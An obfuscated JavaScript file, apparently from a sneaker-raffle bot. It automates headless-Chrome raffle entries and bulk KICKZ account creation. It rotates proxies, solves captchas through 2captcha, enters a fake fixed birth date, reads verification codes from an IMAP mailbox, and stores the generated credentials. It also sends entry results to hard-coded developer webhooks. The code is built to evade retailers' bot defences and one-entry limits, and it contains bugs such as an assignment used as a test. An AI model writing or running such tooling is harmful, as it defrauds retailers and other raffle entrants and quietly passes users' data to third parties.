                    await _0x497396(0xc8), await _0x468b99(_0x4bb1d6, _0x419bc0['succesDEVMSG']), await _0x497396(0xc8);
                    try {
                        await _0x468b99(_0x196877, _0x419bc0['succesPUBMSG']);
                    } catch {
                    }
                    if (_0x2da8e6[_0x1402a8]['Email'] == '' || _0x2da8e6[_0x1402a8]['Url'] == '' || _0x2da8e6[_0x1402a8]['FirstName'] == '' || _0x2da8e6[_0x1402a8]['LastName'] == '') {
                        console['log'](_0x5d34e1() + '\x20[' + _0x3e5733[taskModule]['name'] + ']\x20Task\x20' + (_0x1402a8 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x138f58['useRandomProxy'] = ![])
                        var _0x3a6566 = _0x103d1a[_0x1402a8]['split'](':');
                    else
                        var _0x3e0e50 = Math['round'](Math['random']() * (_0x103d1a['length'] - 0x1)), _0x3a6566 = _0x103d1a[_0x3e0e50]['split'](':');
                    var _0x4d22f5;
                    try {
                        _0x4d22f5 = await _0x256d58['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x3a6566[0x0] + ':' + _0x3a6566[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x4d22f5 = await _0x256d58['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x3a6566[0x0] + ':' + _0x3a6566[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x4ce356 = await _0x4d22f5['newPage']();
                        await _0x4ce356['authenticate']({
                            'username': '' + _0x3a6566[0x2],
                            'password': '' + _0x3a6566[0x3]
                        }), console['log'](_0x5d34e1() + '\x20[' + _0x107dd7['name'] + ']\x20Task\x20' + (_0x1402a8 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4ce356['setRequestInterception'](!![]), _0x4ce356['on']('request', _0x5bf26a => {
                            _0x5bf26a['resourceType']() === 'image' || _0x5bf26a['resourceType']() === 'font' || _0x5bf26a['resourceType']() === 'media' ? _0x5bf26a['abort']() : _0x5bf26a['continue']();
                        });
                        try {
                            await _0x4ce356['goto']('' + _0x2da8e6[_0x1402a8]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        try {
                            await _0x4ce356['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
                        } catch {
                            throw new Error('Not\x20an\x20Active\x20Raffle');
                        }
                        console['log'](_0x5d34e1() + '\x20[' + _0x107dd7['name'] + ']\x20Task\x20' + (_0x1402a8 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x4ce356['type']('#comp_firstname', '' + _0x2da8e6[_0x1402a8]['FirstName']), await _0x4ce356['waitForSelector']('#comp_lastname'), await _0x4ce356['type']('#comp_lastname', '' + _0x2da8e6[_0x1402a8]['LastName']), await _0x4ce356['waitForSelector']('#comp_email'), await _0x4ce356['type']('#comp_email', '' + _0x2da8e6[_0x1402a8]['Email']), await _0x4ce356['waitForSelector']('#comp_paypalemail'), await _0x4ce356['type']('#comp_paypalemail', '' + _0x2da8e6[_0x1402a8]['Email']), await _0x4ce356['waitForSelector']('#comp_mobile_end'), await _0x4ce356['type']('#comp_mobile_end', '' + _0x2da8e6[_0x1402a8]['Phone']), await _0x4ce356['waitForSelector']('#comp_dob'), await _0x4ce356['type']('#comp_dob', '08/09/1992'), console['log'](_0x5d34e1() + '\x20[' + _0x107dd7['name'] + ']\x20Task\x20' + (_0x1402a8 + 0x1) + '\x20:\x20Choosing\x20Size');
                        if (_0x2da8e6[_0x1402a8]['Size'] == 'RANDOM') {
                            const _0x49433d = await _0x4ce356['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x25ff4e => {
                                return _0x25ff4e['map'](_0x1c58ee => _0x1c58ee['value']);
                            });
                            var _0x5e6ad4 = Math['round'](Math['random']() * (_0x49433d['length'] - 0x2));
                            await _0x4ce356['select']('#shoesize', _0x49433d[_0x5e6ad4 + 0x1]), await _0x497396(0x3e8);
                        } else {
                            const _0x399e95 = await _0x4ce356['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x395b49 => {
                                return _0x395b49['map'](_0x5f21c2 => _0x5f21c2['innerText']);
                            }), _0x235f67 = await _0x4ce356['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x153c22 => {
                                return _0x153c22['map'](_0xfbd25 => _0xfbd25['value']);
                            });
                            var _0x5a9c16 = _0x2da8e6[_0x1402a8]['Size'];
                            for (var _0x35e30a = 0x1; _0x35e30a < _0x235f67['length']; _0x35e30a++) {
                                var _0x1a921f = _0x399e95[_0x35e30a]['split']('\x20')[0x0];
                                if (_0x1a921f == _0x5a9c16) {
                                    await _0x4ce356['select']('#shoesize', _0x235f67[_0x35e30a]);
                                    break;
                                } else {
                                    if (_0x35e30a + 0x1 == _0x235f67['length'])
                                        throw new Error('Size\x20Not\x20Found..');
                                }
                            }
                        }
                        await _0x4ce356['waitForSelector']('#comp_address1'), await _0x4ce356['type']('#comp_address1', _0x2da8e6[_0x1402a8]['Address1'] + '\x20' + _0x2da8e6[_0x1402a8]['HouseNumber']), await _0x4ce356['waitForSelector']('#comp_address2'), await _0x4ce356['type']('#comp_address2', '' + _0x2da8e6[_0x1402a8]['Address2']), await _0x4ce356['waitForSelector']('#comp_address2'), await _0x4ce356['type']('#comp_address3', '' + _0x2da8e6[_0x1402a8]['City']), await _0x4ce356['waitForSelector']('#comp_postcode'), await _0x4ce356['type']('#comp_postcode', '' + _0x2da8e6[_0x1402a8]['Zip']), console['log'](_0x5d34e1() + '\x20[' + _0x107dd7['name'] + ']\x20Task\x20' + (_0x1402a8 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x497396(0x4b0), await _0x4ce356['click']('label#emailhold'), await _0x497396(0x5dc), await _0x4ce356['click']('#preauth_tandc_email\x20>\x20label'), await _0x497396(0x5dc), await _0x4ce356['click']('#submit');
                        try {
                            await _0x4ce356['waitForSelector']('#paymentWrap');
                        } catch {
                            throw new Error('Could\x20not\x20find\x20Payment');
                        }
                        console['log'](_0x5d34e1() + '\x20[' + _0x107dd7['name'] + ']\x20Task\x20' + (_0x1402a8 + 0x1) + '\x20:\x20' + _0xc3fc3['blue']('Awaiting\x20Paypal\x20Payment')), _0x4d22f5['on']('targetcreated', async _0x323f00 => {
                            if (_0x323f00['type']() === 'page') {
                                const _0x91489e = await _0x323f00['page']();
                                async function _0x4ef533() {
                                    try {
                                        await _0x4ce356['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x56d957 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                async function _0x55ff60() {
                                    try {
                                        await _0x4ce356['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x1e4c94 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                _0x55ff60(), _0x4ef533(), await _0x497396(0x493e0);
                            }
                        });
                        async function _0x2ec650() {
                            for (let _0x3b4928 = 0x0; _0x3b4928 < 0x12c; _0x3b4928++) {
                                if (_0x1e4c94 == !![]) {
                                    _0xbe5ac2 = 'no', _0xf67db6(_0x2da8e6[_0x1402a8], _0x107dd7), console['log'](_0xc3fc3['green'](_0x5d34e1() + '\x20[' + _0x107dd7['name'] + ']\x20Task\x20' + (_0x1402a8 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                    if (_0x138f58['webhook'] != undefined && _0x138f58['webhook'] != '')
                                        try {
                                            await _0x468b99(_0x138f58['webhook'], _0x419bc0['succesDEVMSG']);
                                        } catch {
                                        }
                                    await _0x497396(0xc8), await _0x468b99(_0x4bb1d6, _0x419bc0['succesDEVMSG']), await _0x497396(0xc8);
                                    try {
                                        await _0x468b99(_0x196877, _0x419bc0['succesPUBMSG']);
                                    } catch {
                                    }
                                    return;
                                } else {
                                    if (_0x56d957)
                                        throw new Error('Paypal\x20Error:\x20Target\x20closed');
                                    else
                                        await _0x497396(0x3e8);
                                }
                            }
                            throw new Error('Paypal\x20Error');
                        }
                        await _0x497396(0xbb8), await _0x4ce356['click']('.zoid-outlet'), await _0x497396(0x7d0), await _0x2ec650();
                    } catch (_0x3af65d) {
                        console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x107dd7['name'] + ']\x20Task\x20' + (_0x1402a8 + 0x1) + '\x20:\x20' + _0x3af65d)), _0x5dead7 = '' + _0x3af65d;
                        var _0x5580fc = await _0x232baa(_0x2da8e6[_0x1402a8], _0x107dd7, 'dev', !![], _0x5dead7);
                        _0x419bc0['errorDEV'] = { 'embeds': [_0x5580fc] }, _0x138f58['webhook'] != undefined && _0x138f58['webhook'] != '' && await _0x468b99(_0x138f58['webhook'], _0x419bc0['errorDEV']), await _0x468b99(_0x432bcc, _0x419bc0['errorDEV']);
                    } finally {
                        _0x4d22f5 && _0x4d22f5['close']();
                        if (_0xbe5ac2 == 'yes' && _0x5d4b76 != 0x5 && _0x5dead7 != 'Size\x20Not\x20Found') {
                            console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x107dd7['name'] + ']\x20Task\x20' + (_0x1402a8 + 0x1) + '\x20:\x20Retrying\x20(' + _0x5d4b76 + '\x20/\x205)')), _0x1402a8 = _0x1402a8 - 0x1, _0x5d4b76 = _0x5d4b76 + 0x1;
                            continue;
                        }
                        _0xbe5ac2 == 'yes' && _0x5d4b76 >= 0x5 && (_0x554010(afew[_0x1402a8], _0x107dd7), _0xbe5ac2 = 'no', _0x5d4b76 = 0x0), console['log']('Waiting\x20for\x20' + _0x138f58['delay'] + '\x20ms'), await _0x497396(_0x138f58['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x36a375, _0x144024, _0x5689bb) {
                    _0x256d58['use'](_0x302cb0()), _0x256d58['use'](_0x247b94({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x138f58['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x33e562 = 0x0; _0x33e562 < _0x144024['length']; _0x33e562++) {
                        const _0x376394 = 'https://www.kickz.com/login';
                        if (_0x22c1ce != 'yes')
                            var _0x22c1ce = '', _0x33b2b6 = 0x0;
                        _0x38ef83(_0x36a375['name'] + '\x20Task\x20' + (_0x33e562 + 0x1) + '\x20/\x20' + _0x144024['length'] + '\x20||\x20File:\x20' + _0x12faac + '\x20Proxies:\x20' + _0x2e164b);
                        try {
                            await _0x494c97(_0x144024, _0x33e562);
                        } catch {
                            _0x22c1ce = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x3e72b1 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x9f5859
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x138f58['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x30d211
                                }
                            ]
                        }];
                        const _0x4b3c08 = { 'embeds': _0x3e72b1 };
                        var _0x6e5d1b = await _0x232baa(_0x144024[_0x33e562], _0x36a375, 'acc', ![]);
                        const _0x1adbb2 = { 'succesDEVMSG': { 'embeds': [_0x6e5d1b] } };
                        if (_0x144024[_0x33e562]['Email'] == '' || _0x144024[_0x33e562]['FirstName'] == '' || _0x144024[_0x33e562]['LastName'] == '') {
                            console['log'](_0x5d34e1() + '\x20[' + _0x36a375['name'] + ']\x20Task\x20' + (_0x33e562 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x144024[_0x33e562]['Password'] == '' && (_0x144024[_0x33e562]['Password'] = 'JRaffles23!');
                        if (_0x138f58['useRandomProxy'] = ![])
                            var _0x1f5fb5 = _0x5689bb[_0x33e562]['split'](':');
                        else
                            var _0x399221 = Math['round'](Math['random']() * (_0x5689bb['length'] - 0x1)), _0x1f5fb5 = _0x5689bb[_0x399221]['split'](':');
                        var _0x10dddc;
                        try {
                            _0x10dddc = await _0x256d58['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1f5fb5[0x0] + ':' + _0x1f5fb5[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x10dddc = await _0x256d58['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1f5fb5[0x0] + ':' + _0x1f5fb5[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x115c2e = await _0x10dddc['newPage']();
                            await _0x115c2e['authenticate']({
                                'username': '' + _0x1f5fb5[0x2],
                                'password': '' + _0x1f5fb5[0x3]
                            }), console['log'](_0x5d34e1() + '\x20[' + _0x36a375['name'] + ']\x20Task\x20' + (_0x33e562 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x115c2e['setRequestInterception'](!![]), _0x115c2e['on']('request', _0x57e05 => {
                                _0x57e05['resourceType']() === 'image' || _0x57e05['resourceType']() === 'font' || _0x57e05['resourceType']() === 'media' ? _0x57e05['abort']() : _0x57e05['continue']();
                            }), await _0x115c2e['goto'](_0x376394), await _0x497396(0xbb8), console['log'](_0x5d34e1() + '\x20[' + _0x36a375['name'] + ']\x20Task\x20' + (_0x33e562 + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x115c2e['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x115c2e['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x115c2e['waitForSelector']('#button-register'), await _0x497396(0x7d0), await _0x115c2e['evaluate'](() => {
                                const _0x4e8763 = document['querySelector']('#button-register');
                                _0x4e8763['click']();
                            }), console['log'](_0x5d34e1() + '\x20[' + _0x36a375['name'] + ']\x20Task\x20' + (_0x33e562 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x497396(0x1388), await _0x115c2e['waitForSelector']('#customer_salutation'), await _0x115c2e['select']('#customer_salutation', 'mr'), await _0x497396(0x7d0), await _0x115c2e['waitForSelector']('#customer_firstname'), await _0x115c2e['type']('#customer_firstname', '' + _0x144024[_0x33e562]['FirstName']), await _0x497396(0x352), await _0x115c2e['waitForSelector']('#customer_lastname'), await _0x115c2e['type']('#customer_lastname', '' + _0x144024[_0x33e562]['LastName']), await _0x497396(0x352), await _0x115c2e['type']('#email-input', '' + _0x144024[_0x33e562]['Email']), await _0x497396(0x352), await _0x115c2e['type']('#email-confirm-input', '' + _0x144024[_0x33e562]['Email']), await _0x497396(0x352), await _0x115c2e['type']('#register-password', '' + _0x144024[_0x33e562]['Password']), await _0x497396(0x352), await _0x115c2e['type']('#password-confirm', '' + _0x144024[_0x33e562]['Password']), await _0x497396(0x352), console['log'](_0x5d34e1() + '\x20[' + _0x36a375['name'] + ']\x20Task\x20' + (_0x33e562 + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x115c2e['click']('#consent'), await _0x497396(0x1f4);
                            const _0x3d38a6 = await _0x115c2e['$']('div.inputErrorMsg.b-form_section-message');
                            if (_0x3d38a6) {
                                console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x36a375['name'] + ']\x20Task\x20' + (_0x33e562 + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                                continue;
                            }
                            await _0x115c2e['click']('#buttonRegister');
                            try {
                                await _0x115c2e['waitForSelector']('#verificationCode');
                            } catch {
                                throw new Error('Account\x20already\x20registered');
                            }
                            console['log'](_0x5d34e1() + '\x20[' + _0x36a375['name'] + ']\x20Task\x20' + (_0x33e562 + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x144024[_0x33e562]['Email']), await _0x497396(0x4b0);
                            async function _0x43cddd() {
                                var _0x175bd6, _0x40e03e = ![];
                                for (var _0x23fcab = 0x0; _0x23fcab < 0x18; _0x23fcab++) {
                                    async function _0x563e8f() {
                                        var _0x1ff62b = new _0x51270e({
                                            'user': _0x138f58['masterMail'],
                                            'password': _0x138f58['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x25bffa(_0x2707d1) {
                                            _0x1ff62b['openBox']('INBOX', ![], _0x2707d1);
                                        }
                                        _0x1ff62b['once']('ready', function () {
                                            console['log'](_0x5d34e1() + '\x20[' + _0x36a375['name'] + ']\x20Task\x20' + (_0x33e562 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x25bffa(function (_0x5dc608, _0x5dc4b9) {
                                                console['log'](_0x5d34e1() + '\x20[' + _0x36a375['name'] + ']\x20Task\x20' + (_0x33e562 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x5dc608)
                                                    throw _0x5dc608;
                                                _0x1ff62b['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'verification@kickz.com'
                                                    ]
                                                ], function (_0x22ed23, _0x1a5cc0) {
                                                    if (!_0x1a5cc0 || !_0x1a5cc0['length'])
                                                        console['log'](_0x5d34e1() + '\x20[' + _0x36a375['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x1ff62b['end']();
                                                    else {
                                                        var _0x5b6010 = _0x1ff62b['seq']['fetch'](_0x1a5cc0, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x5b6010['on']('message', function (_0x493fd9, _0x5e04ed) {
                                                            var _0x5578f3 = '(#' + _0x5e04ed + ')\x20';
                                                            _0x493fd9['on']('body', function (_0x2fdefe, _0x4056aa) {
                                                                _0x3bc712(_0x2fdefe, (_0x39662f, _0x1e8b3e) => {
                                                                    if (_0x1e8b3e['subject'] == 'Kickz\x20Account\x20Verification\x20Code') {
                                                                        var _0x5708c5 = _0x1e8b3e['html']['split']('<div\x20style=\x22display:block;font-family:Arial,sans-serif;font-size:\x2030px;font-weight:\x20600;line-height:24px;color:#333333\x22>'), _0x176520 = _0x5708c5[0x1]['split']('<')[0x0];
                                                                        _0x175bd6 = _0x176520;
                                                                    }
                                                                });
                                                            }), _0x493fd9['once']('end', function () {
                                                            });
                                                        }), _0x5b6010['once']('error', function (_0x4cbc74) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x5b6010['once']('end', function () {
                                                            _0x1ff62b['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x1ff62b['once']('error', function (_0x289516) {
                                            console['log'](_0xc3fc3['red'](_0x289516['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x40e03e = !![];
                                        }), _0x1ff62b['once']('end', async function () {
                                        }), _0x1ff62b['connect']();
                                    }
                                    _0x563e8f(), await _0x497396(0x1388);
                                    if (_0x175bd6)
                                        return _0x175bd6;
                                    if (_0x40e03e)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x23fcab == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x43cddd(), _0x497396(0x320), console['log'](_0x5d34e1() + '\x20[' + _0x36a375['name'] + ']\x20Task\x20' + (_0x33e562 + 0x1) + '\x20:\x20Verifying..'), await _0x115c2e['type']('#verificationCode', code), await _0x497396(0x1f4), await _0x115c2e['click']('#buttonVerify'), await _0x497396(0x190), await _0x115c2e['click']('#buttonVerify'), await _0x497396(0x3e8);
                            try {
                                await _0x115c2e['waitForSelector']('div.b-user_greeting'), _0x22c1ce = 'no', console['log'](_0xc3fc3['green'](_0x5d34e1() + '\x20[' + _0x36a375['name'] + ']\x20Task\x20' + (_0x33e562 + 0x1) + '\x20:\x20Account\x20' + _0x144024[_0x33e562]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x44f9d7['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x144024[_0x33e562]['Email'] + ',' + _0x144024[_0x33e562]['Password'] + ','), console['log'](_0x5d34e1() + '\x20[' + _0x36a375['name'] + ']\x20Task\x20' + (_0x33e562 + 0x1) + '\x20:\x20Account\x20' + _0x144024[_0x33e562]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                                try {
                                    _0x138f58['webhook'] != undefined && _0x138f58['webhook'] != '' && await _0x468b99(_0x138f58['webhook'], _0x1adbb2['succesDEVMSG']);
                                } catch {
                                }
                                await _0x468b99(_0x1e3801, _0x1adbb2['succesDEVMSG']);
                            } catch {
                                _0x22c1ce = 'no', console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x36a375['name'] + ']\x20Task\x20' + (_0x33e562 + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x36a375['name'] + ']\x20Task\x20' + (_0x33e562 + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
                            }
                        } catch (_0x5131ed) {
                            console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x36a375['name'] + ']\x20Task\x20' + (_0x33e562 + 0x1) + '\x20:\x20' + _0x5131ed)), _0x3e72b1[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x3e72b1[0x0]['description'] = '' + _0x5131ed, await _0x468b99(_0x432bcc, _0x4b3c08), _0x22c1ce = 'yes';
                        } finally {
                            _0x10dddc && _0x10dddc['close']();
                            if (_0x22c1ce == 'yes' && _0x33b2b6 != 0x5) {
                                console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x36a375['name'] + ']\x20Task\x20' + (_0x33e562 + 0x1) + '\x20:\x20Retrying\x20(' + _0x33b2b6 + '\x20/\x205)')), _0x33e562 = _0x33e562 - 0x1, _0x33b2b6 = _0x33b2b6 + 0x1;
                                continue;
                            }
                            _0x22c1ce == 'yes' && _0x33b2b6 >= 0x5 && (_0x554010(_0x144024[_0x33e562], _0x36a375), _0x22c1ce = 'no', _0x33b2b6 = 0x0), console['log']('Waiting\x20for\x20' + _0x138f58['delay'] + '\x20ms'), await _0x497396(_0x138f58['delay']);
                        }
                    }
                }
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x16594f, _0x54e191, _0x12beb5) {
                    _0x256d58['use'](_0x302cb0()), _0x256d58['use'](_0x247b94({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x138f58['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x13d2ac = 0x0; _0x13d2ac < _0x54e191['length']; _0x13d2ac++) {
                        var _0x52bbd8;
                        if (_0x12e30c != 'yes')
                            var _0x12e30c = '', _0x254f44 = 0x0;
                        _0x38ef83(_0x16594f['name'] + '\x20Task\x20' + (_0x13d2ac + 0x1) + '\x20/\x20' + _0x54e191['length'] + '\x20||\x20File:\x20' + _0x12faac + '\x20Proxies:\x20' + _0x2e164b);
                        var _0x2b9f2e = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Entry',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x9f5859
                                },
                                {
                                    'name': 'Product',
                                    'value': '' + _0x54e191[_0x13d2ac]['Url']
                                },
                                {
                                    'name': 'Size',
                                    'value': '' + _0x54e191[_0x13d2ac]['Size']
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x138f58['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x30d211
                                }
                            ]
                        }];
                        let _0x4d50cd = [
                            'Email',
                            'Password',
                            'FirstName',
                            'LastName',
                            'Size',
                            'Address1',
                            'HouseNumber',
                            'Zip',
                            'Country',
                            'City'
                        ], _0x58d52c = ![];
                        for (key of _0x4d50cd) {
                            if (_0x54e191[_0x13d2ac][key] == '' || !_0x54e191[_0x13d2ac][key]) {
                                console['log'](_0x5d34e1() + '\x20[' + _0x16594f['name'] + ']\x20Task\x20' + (_0x13d2ac + 0x1) + '\x20:\x20Invalid\x20CSV,\x20' + key + '\x20not\x20found'), _0x58d52c = !![];
                                break;
                            }
                        }
                        if (_0x58d52c) {
                            await _0x497396(0x1f4);
                            continue;
                        }
                        var _0x63875e = await _0x232baa(_0x54e191[_0x13d2ac], _0x16594f, 'dev', ![]), _0x1e0f1e = await _0x232baa(_0x54e191[_0x13d2ac], _0x16594f, 'pub', ![]);
                        const _0x24a067 = {
                            'succesDEVMSG': { 'embeds': [_0x63875e] },
                            'succesPUBMSG': { 'embeds': [_0x1e0f1e] }
                        };
                        try {
                            await _0x494c97(_0x54e191, _0x13d2ac);
                        } catch {
                            _0x12e30c = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x138f58['useRandomProxy'] = ![])
                            var _0x9f6092 = _0x12beb5[_0x13d2ac]['split'](':');
                        else
                            var _0x2fd7e3 = Math['round'](Math['random']() * (_0x12beb5['length'] - 0x1)), _0x9f6092 = _0x12beb5[_0x2fd7e3]['split'](':');
                        var _0x1b8be6;
                        try {
                            _0x1b8be6 = await _0x256d58['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x9f6092[0x0] + ':' + _0x9f6092[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x1b8be6 = await _0x256d58['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x9f6092[0x0] + ':' + _0x9f6092[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x2ced0a = await _0x1b8be6['newPage']();
                            await _0x2ced0a['authenticate']({
                                'username': '' + _0x9f6092[0x2],
                                'password': '' + _0x9f6092[0x3]
                            }), console['log'](_0x5d34e1() + '\x20[' + _0x16594f['name'] + ']\x20Task\x20' + (_0x13d2ac + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2ced0a['setRequestInterception'](!![]), _0x2ced0a['on']('request', _0x4224b2 => {
                                _0x4224b2['resourceType']() === 'image' || _0x4224b2['resourceType']() === 'font' || _0x4224b2['resourceType']() === 'media' ? _0x4224b2['abort']() : _0x4224b2['continue']();
                            }), await _0x2ced0a['goto']('' + _0x54e191[_0x13d2ac]['Url']['replace']('\x20', ''), { 'waitUntil': 'networkidle2' }), await _0x497396(0x12c), await _0x2ced0a['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x2ced0a['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x497396(0x7d0);
                            try {
                                await _0x2ced0a['click']('a[title=\x22Sign\x20In\x22]');
                            } catch {
                                await _0x2ced0a['click']('a[title=\x22sign\x20in\x22]');
                            }
                            console['log'](_0x5d34e1() + '\x20[' + _0x16594f['name'] + ']\x20Task\x20' + (_0x13d2ac + 0x1) + '\x20:\x20Logging\x20in'), await _0x2ced0a['waitForSelector']('#username'), await _0x2ced0a['type']('#username', _0x54e191[_0x13d2ac]['Email']), await _0x2ced0a['waitForSelector']('#password'), await _0x2ced0a['type']('#password', _0x54e191[_0x13d2ac]['Password']), await _0x497396(0x190), await _0x2ced0a['click']('#buttonSubmit'), await _0x2ced0a['waitForSelector']('.b-variation_swatch-value_overlay'), console['log'](_0x5d34e1() + '\x20[' + _0x16594f['name'] + ']\x20Task\x20' + (_0x13d2ac + 0x1) + '\x20:\x20Getting\x20Product'), await _0x497396(0x1f4), console['log'](_0x5d34e1() + '\x20[' + _0x16594f['name'] + ']\x20Task\x20' + (_0x13d2ac + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x54e191[_0x13d2ac]['Size']);
